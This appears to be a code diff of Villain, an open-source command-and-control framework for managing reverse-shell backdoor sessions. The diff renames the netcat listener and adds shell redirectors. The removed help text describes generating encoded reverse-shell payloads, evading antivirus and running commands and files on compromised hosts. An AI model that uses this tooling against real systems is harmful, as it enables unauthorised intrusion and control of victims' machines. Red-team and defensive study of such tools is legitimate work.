@@ -20,7 +20,7 @@ parser = argparse.ArgumentParser()
 
 parser.add_argument("-p", "--port", action="store", help = "Team server port (default: 6501).", type = int)
 parser.add_argument("-x", "--hoax-port", action="store", help = "HoaxShell server port (default: 8080 via http, 443 via https).", type = int)
-parser.add_argument("-n", "--netcat-port", action="store", help = "Netcat multi-listener port (default: 4443).", type = int)
+parser.add_argument("-n", "--reverse-tcp-port", action="store", help = "Reverse TCP multi-handler port (default: 4443).", type = int)
 parser.add_argument("-f", "--file-smuggler-port", action="store", help = "Http file smuggler server port (default: 8888).", type = int)
 parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any Villain client (sibling server) to connect to your instance without prompting you for verification.")
 parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for HoaxShell https server).")
@@ -45,7 +45,7 @@ if Hoaxshell_Settings.ssl_support:
 	Hoaxshell_Settings.bind_port_ssl = args.hoax_port if args.hoax_port else Hoaxshell_Settings.bind_port_ssl
 
 Core_Server_Settings.bind_port = args.port if args.port else Core_Server_Settings.bind_port
-TCP_Sock_Handler_Settings.bind_port = args.netcat_port if args.netcat_port else TCP_Sock_Handler_Settings.bind_port
+TCP_Sock_Handler_Settings.bind_port = args.reverse_tcp_port if args.reverse_tcp_port else TCP_Sock_Handler_Settings.bind_port
 File_Smuggler_Settings.bind_port = args.file_smuggler_port if args.file_smuggler_port else File_Smuggler_Settings.bind_port
 
 # Check if there are port number conflicts
@@ -133,329 +133,6 @@ def print_meta():
 	print(f'{META} Follow on GitHub, X, YT: @t3l3machus')
 	print(f'{META} Thank you!\n')
 
-
-
-class PrompHelp:
-	
-	commands = {
-	
-		'connect' : {
-			'details' : f''' 			
-Connect with another instance of Villain (sibling server). Once connected, you will be able to see and interact with foreign shell sessions owned by sibling servers and vice-versa. Multiple sibling servers can be connected at once. The limit of connections depends on the number of active threads a Villain instance can have (adjustable). In case you forgot the team server port number (default: 6501), use "sockets" to list Villain related services info. Read the Usage Guide or check my YouTube channel (@HaxorTechTones) for details.
-
-connect <IP> <TEAM_SERVER_PORT>''',
-			'least_args' : 2,
-			'max_args' : 2
-		},
-				
-				
-		'generate' : {
-			'details' : f''' 		
-Generate a reverse shell command. This function has been redesigned to use payload templates, which you can find in Villain/Core/payload_templates and edit or create your own.
-
-Main logic:
-generate payload=<OS_TYPE/HANDLER/PAYLOAD_TEMPLATE> lhost=<IP or INTERFACE> [ obfuscate encode ]
-
-Usage examples:
-generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
-generate payload=linux/hoaxshell/sh_curl lhost=eth0
-
-- The ENCODE and OBFUSCATE attributes are enabled for certain templates and can be used during payload generation. 
-- For info on a particular template, use "generate" with PAYLOAD being the only provided argument.
-- To catch HoaxShell https-based reverse shells you need to start Villain with SSL.
-- Ultimately, one should edit the templates and add obfuscated versions of the commands for AV evasion.''',
-			'least_args' : 0, # Intentionally set to 0 so that the Payload_Generator class can inform users about missing arguments
-			'max_args' : 7
-		},			
-
-
-		'exec' : {
-			'details' : f''' 			
-Execute a command or file against an active backdoor session. Files are executed by being http requested from the Http File Smuggler. The feature works regardless if the session is owned by you or a sibling server.
-	
-exec <COMMAND or LOCAL FILE PATH> <SESSION ID or ALIAS>
-
-*Command(s) should be quoted.''',
-			'least_args' : 2,
-			'max_args' : 2
-		},			
-
-
-		'repair' : {
-			'details' : f''' 			
-Use this command to manually correct a backdoor session's hostname/username value, in case Villain does not interpret the information correctly when the session is established.
- 	
-repair <SESSION ID or ALIAS> <HOSTNAME or USERNAME> <NEW VALUE>''',
-			'least_args' : 3,
-			'max_args' : 3
-		},	
-			
-		'shell' : {
-			'details' : f''' 			
-Enables an interactive pseudo-shell prompt for a backdoor session. Press Ctrl+C to disable.
- 
-shell <SESSION ID or ALIAS>''',
-			'least_args' : 1,
-			'max_args' : 1
-		},			
-
-			
-		'alias' : {
-			'details' : f'''
-Set an alias for a backdoor session to use instead of session ID.
-
-alias <ALIAS> <SESSION ID>''',
-			'least_args' : 2,
-			'max_args' : 2
-		},			
-
-			
-		'reset' : {
-			'details' : f'''
-Reset a given alias to the original session ID.
-
-reset <ALIAS>''',
-			'least_args' : 1,
-			'max_args' : 1
-		},			
-
-		
-		'kill' : {
-			'details' : f'''
-Terminate a self-owned backdoor session.
-
-kill <SESSION ID or ALIAS>''',
-			'least_args' : 1,
-			'max_args' : 1
-		},		
-
-		
-		'help' : {
-			'details' : f'''Really?''',
-			'least_args' : 0,
-			'max_args' : 1
-		},
-
-		'siblings' : {
-			'details' : f'''
-Print info about connected Sibling Servers. 
-Siblings are basically other instances of Villain that you are connected with.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-		'threads' : {
-			'details' : f'''
-Villain creates a lot of threads to be able to handle multiple backdoor sessions, connections with siblings and more. In file Villain/Core/settings.py there is a BoundedSemaphore that works as a thread limiter to prevent resource contention, set by default to 100 (you can of course change it). This command lists the active threads created by Villain, to give you an idea of what is happening in the background, what is the current value of the thread limiter etc.
-  
-Note that, if the thread limiter reaches 0, weird things will start happening as new threads (e.g. backdoor sessions) will be queued until: thread limiter > 0.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-		'sessions' : {
-			'details' : f'''Prints info about active backdoor shell sessions.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-		'backdoors' : {
-			'details' : f'''Prints specifics about the shell and listener types of active backdoor shell sessions.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-		'sockets' : {
-			'details' : f'''Prints Villain related socket services info.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-		'id' : {
-			'details' : f'''Print server's unique ID.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-		'upload' : {
-			'details' : f'''
-Upload files to a poisoned machine (files are auto-requested from the http file smuggler). The feature works regardless if the session is owned by you or a sibling server. You can run the command from Villain's main prompt as well as the pseudo shell terminal.
-
-From the main prompt:
-upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH> <SESSION ID or ALIAS>
-
-From an active pseudo shell prompt:
-upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH>''',
-			'least_args' : 3,
-			'max_args' : 3
-		},
-
-		'cmdinspector' : {
-			'details' : f'''
-Villain has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). 
-Use the cmdinspector command to turn that feature on/off. 
-
-cmdinspector <ON / OFF>''',
-			'least_args' : 1,
-			'max_args' : 1
-		},
-
-		'conptyshell' : {
-			'details' : f'''
-Automatically runs Invoke-ConPtyShell against a session. A new terminal window with netcat listening will pop up (you need to have gnome-terminal installed) and the script will be executed on the target as a new process, meaning that, you get a fully interactive shell AND you get to keep your backdoor. Currently works only for powershell.exe sessions.
-Because I love Invoke-ConPtyShell.
-
-Usage: 
-conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>''',
-			'least_args' : 3,
-			'max_args' : 3
-		},
-
-		'exit' : {
-			'details' : f'''Kill all self-owned sessions and quit.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-		'flee' : {
-			'details' : f'''Quit without terminating active sessions. When you start Villain again, if any HoaxShell implant is still running on previously injected hosts, the session(s) will be re-established.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-		'clear' : {
-			'details' : f'''Come on man.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-		'purge' : {
-			'details' : f'''Villain automatically stores information regarding generated implants and loads them in memory every time it starts. This way, HoaxShell generated implants become reusable and it is possible to re-establish older sessions, assuming the payload is still running on the victim(s). Use this command to delete all session related metadata. It does not affect any active sessions you may have.''',
-			'least_args' : 0,
-			'max_args' : 0
-		},
-
-	}
-	
-	
-	@staticmethod
-	def print_main_help_msg():
-				
-		print(
-		f'''
-		\r  Command              Description
-		\r  -------              -----------
-		\r  help         [+]     Print this message.
-		\r  connect      [+]     Connect with a sibling server.
-		\r  generate     [+]     Generate backdoor payload.
-		\r  siblings             Print sibling servers data table.
-		\r  sessions             Print established backdoor sessions data table.
-		\r  backdoors            Print established backdoor types data table.
-		\r  sockets              Print Villain related running services' info.
-		\r  shell        [+]     Enable an interactive pseudo-shell for a session.
-		\r  exec         [+]     Execute command/file against a session.
-		\r  upload       [+]     Upload files to a backdoor session.
-		\r  alias        [+]     Set an alias for a shell session.
-		\r  reset        [+]     Reset alias back to the session's unique ID.
-		\r  kill         [+]     Terminate an established backdoor session.
-		\r  conptyshell  [+]     Slap Invoke-ConPtyShell against a backdoor session.
-		\r  repair       [+]     Manually correct a session's hostname/username info.
-		\r  id                   Print server's unique ID (Self).
-		\r  cmdinspector [+]     Turn Session Defender on/off.
-		\r  threads              Print information regarding active threads.
-		\r  clear                Clear screen.
-		\r  purge                Delete all stored sessions metadata.
-		\r  flee                 Quit without terminating active sessions.
-		\r  exit                 Kill all sessions and quit.
-		\r  
-		\r  Commands starting with "#" are interpreted as messages and will be 
-		\r  broadcasted to all connected Sibling Servers (chat).
-		\r
-        \r  Commands with [+] may require additional arguments.
-        \r  For details use: {ORANGE}help <COMMAND>{END}
-		''')
-			
-
-
-	@staticmethod
-	def print_detailed(cmd):			
-		PrompHelp.print_justified(PrompHelp.commands[cmd]['details'].strip()) if cmd in PrompHelp.commands.keys() \
-		else print(f'No details for command "{cmd}".')
-
-
-	@staticmethod
-	def print_justified(text):
-		
-		text_length = len(text)
-		text_lines = text.split('\n')
-		wrapped_text = ''
-		term_width = os.get_terminal_size().columns
-		term_width_p = 100 if 100 <= (term_width) else term_width - 2
-		
-		if text_length >= term_width_p:
-			
-			lines = []
-			
-			for p in text_lines:
-				
-				if len(p) <= (term_width_p - 3):
-					lines.append('  ' + p + ' ')
-					continue
-
-				words = p.split(' ')
-
-				if words == ['']:
-					continue
-
-				else:					
-					words_s = [w + ' ' for w in words]
-					line_length = 0
-					count = s = 0
-
-					for w in words_s:
-						
-						line_length += len(w)
-
-						if line_length < (term_width_p - 3):
-							count += 1
-
-						else:							
-							lines.append('  ' + ' '.join(words[s:count]) + ' ')
-							s = count
-							count += 1
-							line_length = len(w)
-					
-					if s < len(words):
-						lines.append(f'  ' + ' '.join(words[s:]) + f' ')
-				
-			wrapped_text = '\n'.join(lines)
-
-		else:
-			wrapped_text = text
-		
-		print('\n' + wrapped_text, end='\n\n')
-
-
-
-	@staticmethod
-	def validate(cmd, num_of_args):
-		
-		valid = True
-		
-		if cmd not in PrompHelp.commands.keys():
-			print('Unknown command.')
-			valid = False
-			
-		elif num_of_args < PrompHelp.commands[cmd]['least_args']:
-			print('Missing arguments.')
-			valid = False
-		
-		elif num_of_args > PrompHelp.commands[cmd]['max_args']:
-			print('Too many arguments. Use "help <COMMAND>" for details.')
-			valid = False			
-	
-		return valid
-
 	
 
 def alias_sanitizer(word, _min = 2, _max = 26):
@@ -486,7 +163,7 @@ class Completer(object):
 		self.main_prompt_commands = clone_dict_keys(PrompHelp.commands)
 		self.main_command_arguments = ['payload', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
 		'exec_outfile', 'domain']
-		self.pseudo_shell_commands = ['upload', 'cmdinspector']
+		self.pseudo_shell_commands = ['upload', 'cmdinspector', 'inject']
 		self.payload_templates_root = os.path.dirname(os.path.abspath(__file__)) + f'{os.sep}Core{os.sep}payload_templates'
 	
 	
@@ -651,11 +328,11 @@ class Completer(object):
 		# print(f'{line_buffer_list_len} - {Main_prompt.ready}  - {main_cmd}')
 		if line_buffer_list_len == 1:
 			match = self.get_match_from_list(main_cmd, self.main_prompt_commands if Main_prompt.ready else self.pseudo_shell_commands)
-			self.update_prompt(len(line_buffer_list[0]), match) if match else chill()
+			self.update_prompt(len(line_buffer_list[0]), match) if match else do_nothing()
 
 	
 		# Autocomplete session IDs
-		elif ((main_cmd in ['exec', 'alias', 'kill', 'shell', 'repair', 'upload', 'conptyshell'] and Main_prompt.ready) or (main_cmd in self.pseudo_shell_commands and not Main_prompt.ready)) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] not in ["/", "~"]):
+		elif ((main_cmd in ['alias', 'kill', 'shell', 'repair', 'conptyshell'] and Main_prompt.ready) or (main_cmd in self.pseudo_shell_commands and not Main_prompt.ready)) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] not in ["/", "~"]):
 			
 			if line_buffer_list[-1] in (Sessions_Manager.active_sessions.keys()):
 				pass
@@ -675,7 +352,7 @@ class Completer(object):
 				# else:
 				word_frag = line_buffer_list[-1]
 				match = self.get_match_from_list(line_buffer_list[-1], list(Sessions_Manager.active_sessions.keys()) + Sessions_Manager.aliases)
-				self.update_prompt(len(line_buffer_list[-1]), match) if match else chill()
+				self.update_prompt(len(line_buffer_list[-1]), match) if match else do_nothing()
 
 
 
@@ -689,7 +366,7 @@ class Completer(object):
 			else:
 				word_frag = line_buffer_list[-1]
 				match = self.get_match_from_list(line_buffer_list[-1], list(Sessions_Manager.aliases))
-				self.update_prompt(len(line_buffer_list[-1]), match) if match else chill()
+				self.update_prompt(len(line_buffer_list[-1]), match) if match else do_nothing()
 
 
 
@@ -716,7 +393,7 @@ class Completer(object):
 
 			else:
 				match = self.get_match_from_list(line_buffer_list[-1], self.main_command_arguments)
-				self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else chill()
+				self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else do_nothing()
 
 
 		# Autocomplete help
@@ -724,12 +401,12 @@ class Completer(object):
 									
 			word_frag = line_buffer_list[-1].lower()
 			match = self.get_match_from_list(line_buffer_list[-1], self.main_prompt_commands)
-			self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else chill()
+			self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else do_nothing()
 
 		
 		# Autocomplete paths
 		
-		elif (main_cmd in ['exec', 'upload']) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] in [os.sep, "~"]):
+		elif (main_cmd in ['inject', 'upload']) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] in [os.sep, "~"]):
 			
 			root = os.sep if (line_buffer_list[-1][0] == os.sep) else os.path.expanduser('~')
 			search_term = line_buffer_list[-1] if (line_buffer_list[-1][0] != '~') else line_buffer_list[-1].replace('~', os.sep)
@@ -743,7 +420,7 @@ class Completer(object):
 	
 def main():
 
-	chill() if args.quiet else print_banner()
+	do_nothing() if args.quiet else print_banner()
 	current_wd = os.path.dirname(os.path.abspath(__file__))
 	
 	# Check for updates
@@ -868,21 +545,21 @@ def main():
 		sys.exit(1)
 
 
-	''' Init Netcat '''
-	netcat = TCP_Sock_Multi_Handler()
-	nc_multi_listener = Thread(target = netcat.initiate_nc_listener, args = (), name = 'nc_tcp_socket_server')
-	nc_multi_listener.daemon = True
-	nc_multi_listener.start()
+	''' Init Reverse TCP multi-handler '''
+	reverseTCP_listener = TCP_Sock_Multi_Handler()
+	reverseTCP_listener_t = Thread(target = reverseTCP_listener.initiate_nc_listener, args = (), name = 'reverse_tcp_multi_handler')
+	reverseTCP_listener_t.daemon = True
+	reverseTCP_listener_t.start()
 
-	# Wait for the Netcat multi listener socket to be established
+	# Wait for the Reverse TCP multi listener socket to be established
 	timeout_start = time()
 
 	while time() < (timeout_start + 5):
 
-		if netcat.listener_initialized:													
+		if reverseTCP_listener.listener_initialized:													
 			break
 		
-		elif netcat.listener_initialized == False:			
+		elif reverseTCP_listener.listener_initialized == False:			
 			sys.exit(1)
 			
 	else:
@@ -913,11 +590,11 @@ def main():
 		if Sessions_Manager.active_sessions or core.sibling_servers:
 			bound = True
 
-		chk_msg = '\nDo you wish to exit without terminating any of your active sessions? [y/n]: ' if flee else \
-		'\nAre you sure you wish to exit? All of your sessions/connections with siblings will be lost [y/n]: '
+		chk_msg = 'Do you wish to exit without terminating any of your active sessions? [y/n]: ' if flee else \
+		'Are you sure you wish to exit? All of your sessions/connections with siblings will be lost [y/n]: '
 
 		try:
-			choice = input(chk_msg).lower().strip() if bound else 'y'
+			choice = input(f'\n{ATT} {chk_msg}').lower().strip() if bound else 'y'
 			verified = True if choice in ['yes', 'y'] else False
 
 		except:
@@ -1001,6 +678,11 @@ def main():
 				if cmd in core.requests.keys():
 					core.requests[cmd] = True
 					continue
+
+				# Notification for deprecated / modified commands
+				elif cmd in ['exec']:
+					print(f'{ATT} Commands "upload" and "exec" can now only be used with an active pseudo shell. "exec" was also renamed to "inject".')
+					continue
 				
 				# Validate number of args
 				valid = PrompHelp.validate(cmd, (cmd_list_len - 1))				
@@ -1045,116 +727,116 @@ def main():
 
 						
 
-				elif cmd == 'exec':
-									
-					if Sessions_Manager.active_sessions.keys():
+
+
+					# if Sessions_Manager.active_sessions.keys():
 						
-						try:
+					# 	try:
 
-							Main_prompt.ready = False
-							Main_prompt.exec_active = True
-							execution_object = cmd_list[1]
-							session_id = cmd_list[2]
-							is_file = False
+					# 		Main_prompt.ready = False
+					# 		Main_prompt.exec_active = True
+					# 		execution_object = cmd_list[1]
+					# 		session_id = cmd_list[2]
+					# 		is_file = False
 
-							# Check if session id has alias
-							session_id = sessions_manager.alias_to_session_id(session_id)
+					# 		# Check if session id has alias
+					# 		session_id = sessions_manager.alias_to_session_id(session_id)
 							
-							if not session_id:
-								print(f'\r[{ERR}] Failed to interpret session_id.')
-								Main_prompt.ready = True
-								continue	
+					# 		if not session_id:
+					# 			print(f'\r[{ERR}] Failed to interpret session_id.')
+					# 			Main_prompt.ready = True
+					# 			continue	
 							
-							shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
+					# 		shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
 							
-							if execution_object[0] in [os.sep, '~']:
+					# 		if execution_object[0] in [os.sep, '~']:
 								
-								file_path = os.path.expanduser(execution_object)
-								is_file = True if os.path.isfile(file_path) else False
+					# 			file_path = os.path.expanduser(execution_object)
+					# 			is_file = True if os.path.isfile(file_path) else False
 								
-								try:
+					# 			try:
 
-									if is_file:
-										execution_object = get_file_contents(file_path, 'r')
-										if execution_object in [None, False, '']: 
-											raise										
-									else:
-										raise
+					# 				if is_file:
+					# 					execution_object = get_file_contents(file_path, 'r')
+					# 					if execution_object in [None, False, '']: 
+					# 						raise										
+					# 				else:
+					# 					raise
 										
-								except:
-									print(f'\r[{ERR}] Failed to read file {file_path}.')
-									Main_prompt.ready = True
-									continue
+					# 			except:
+					# 				print(f'\r[{ERR}] Failed to read file {file_path}.')
+					# 				Main_prompt.ready = True
+					# 				continue
 
-							if not is_file and execution_object.lower() == 'exit':
-								print(f'\r[{INFO}] The proper way to terminate a session is by using the "kill <SESSION ID>" prompt command.')
-								Main_prompt.ready = True
-								continue
+					# 		if not is_file and execution_object.lower() == 'exit':
+					# 			print(f'\r[{INFO}] The proper way to terminate a session is by using the "kill <SESSION ID>" prompt command.')
+					# 			Main_prompt.ready = True
+					# 			continue
 
-							if not is_file:
-								# Invoke Session Defender to inspect the command for dangerous input
-								dangerous_input_detected = False
+					# 		if not is_file:
+					# 			# Invoke Session Defender to inspect the command for dangerous input
+					# 			dangerous_input_detected = False
 
-								if Session_Defender.is_active:
-									dangerous_input_detected = Session_Defender.inspect_command(Sessions_Manager.active_sessions[session_id]['OS Type'], execution_object)
+					# 			if Session_Defender.is_active:
+					# 				dangerous_input_detected = Session_Defender.inspect_command(Sessions_Manager.active_sessions[session_id]['OS Type'], execution_object)
 
-								if dangerous_input_detected:
-									Session_Defender.print_warning()
-									Main_prompt.ready = True
-									continue								
+					# 			if dangerous_input_detected:
+					# 				Session_Defender.print_warning()
+					# 				Main_prompt.ready = True
+					# 				continue								
 							
-							# If file, check if shell type is supported for exec
-							if shell_type not in ['unix', 'powershell.exe']:
-								print(f'\r[{INFO}] Script execution not supported for shell type: {shell_type}')
-								Main_prompt.ready = True
-								continue								
+					# 		# If file, check if shell type is supported for exec
+					# 		if shell_type not in ['unix', 'powershell.exe']:
+					# 			print(f'\r[{INFO}] Script execution not supported for shell type: {shell_type}')
+					# 			Main_prompt.ready = True
+					# 			continue								
 
-							# Check if any sibling server has an active pseudo shell on that session
-							shell_occupied = core.is_shell_session_occupied(session_id)
+					# 		# Check if any sibling server has an active pseudo shell on that session
+					# 		shell_occupied = core.is_shell_session_occupied(session_id)
 
-							if not shell_occupied:
-								# Check the session's stability and warn user
-								approved = True
+					# 		if not shell_occupied:
+					# 			# Check the session's stability and warn user
+					# 			approved = True
 
-								if Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Unstable':
-									try:
-										choice = input(f'\r[{WARN}] This session is unstable. Running I/O-intensive commands may cause it to hang. Proceed? [y/n]: ')
-										approved = True if choice.lower().strip() in ['yes', 'y'] else False
-									except:
-										print()
-										approved = False
+					# 			if Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Unstable':
+					# 				try:
+					# 					choice = input(f'\r[{WARN}] This session is unstable. Running I/O-intensive commands may cause it to hang. Proceed? [y/n]: ')
+					# 					approved = True if choice.lower().strip() in ['yes', 'y'] else False
+					# 				except:
+					# 					print()
+					# 					approved = False
 									
 
-								if approved:
-									# Check who is the owner of the shell session
-									session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')
+					# 			if approved:
+					# 				# Check who is the owner of the shell session
+					# 				session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')
 									
-									if session_owner_id == core.return_server_uniq_id():
-										File_Smuggler.fileless_exec(execution_object, session_id, issuer = 'self') if is_file \
-											else Hoaxshell.command_pool[session_id].append(execution_object)
+					# 				if session_owner_id == core.return_server_uniq_id():
+					# 					File_Smuggler.fileless_exec(execution_object, session_id, issuer = 'self') if is_file \
+					# 						else Hoaxshell.command_pool[session_id].append(execution_object)
 									
-									else:
-										core.send_receive_one_encrypted(session_owner_id, [execution_object, session_id], 'exec_file') if is_file \
-											else Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, execution_object)
-								else:
-									Main_prompt.ready = True
-									continue										
+					# 				else:
+					# 					core.send_receive_one_encrypted(session_owner_id, [execution_object, session_id], 'exec_file') if is_file \
+					# 						else Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, execution_object)
+					# 			else:
+					# 				Main_prompt.ready = True
+					# 				continue										
 
-							else:
-								print(f'\r[{INFO}] This session is currently being used by a sibling server.')
-								Main_prompt.ready = True
-								continue									
+					# 		else:
+					# 			print(f'\r[{INFO}] This session is currently being used by a sibling server.')
+					# 			Main_prompt.ready = True
+					# 			continue									
 							
-							# Reset prompt if session status is Undefined or Lost 
-							if Sessions_Manager.active_sessions[session_id]['Status'] in ['Undefined', 'Lost']:
-								Main_prompt.ready = True
+					# 		# Reset prompt if session status is Undefined or Lost 
+					# 		if Sessions_Manager.active_sessions[session_id]['Status'] in ['Undefined', 'Lost']:
+					# 			Main_prompt.ready = True
 							
-						except KeyboardInterrupt:
-							Main_prompt.ready = True
-							continue
+					# 	except KeyboardInterrupt:
+					# 		Main_prompt.ready = True
+					# 		continue
 
-					else:
-						print(f'\r[{INFO}] No active session.')		
+					# else:
+					# 	print(f'\r[{INFO}] No active session.')		
 
 						
 
@@ -1517,6 +1199,63 @@ def main():
 					if chk.lower().strip() in ['yes', 'y']:
 						cm = clear_metadata()
 						print(f'Operation completed.') if cm else print('Something went wrong.')
+
+					else:
+						continue
+
+
+				elif cmd == 'redirectors':
+					
+					shell_redirectors = list(Sessions_Manager.shell_redirectors.keys())
+
+					if len(cmd_list) == 1:
+						if shell_redirectors:
+							i = 0
+							print(f'\n{BOLD}Shell Redirectors{END}\n')
+							print('ID   Session               Sibling')
+							print('---  --------------------  --------------------------------')
+														
+							for sid in shell_redirectors:
+								print(f'{i:3d}  {sid}  {Sessions_Manager.shell_redirectors[sid]}')
+								i += 1
+							print()
+						else:
+							print('No active redirectors.')
+
+					if len(cmd_list) == 2:
+						print('Missing arguments.')
+
+					elif len(cmd_list) == 3:
+						operation = cmd_list[1].lower().strip()
+						if operation == 'pop':
+							try:
+								redirector_id = int(cmd_list[2])
+							except:
+								redirector_id = False
+								print('Redirector id must be integer.')
+							
+							redirectors_len = len(shell_redirectors)
+							if not redirectors_len:
+								print('No active redirectors detected.')
+							else:
+								if redirector_id <= redirectors_len and redirector_id >= 0:
+									for i in range(0, redirectors_len):
+										if i == redirector_id:
+											shell_occupied = core.is_shell_session_occupied(shell_redirectors[i])
+											if shell_occupied:
+												choice = input('This shell session seems to be occupied by a sibling server. Are you sure you want to remove the traffic redirector? [Y/n]: ')
+												if choice.lower().strip() in ['y', 'yes']:
+													del Sessions_Manager.shell_redirectors[shell_redirectors[i]]
+													print('Redirector removed.')
+												else:
+													print('Operation aborted.')
+								else:
+									print('Redirector ID does not exist.')
+
+						else:
+							print(f'Unknown operation: {operation}')
+
+
 
 					else:
 						continue
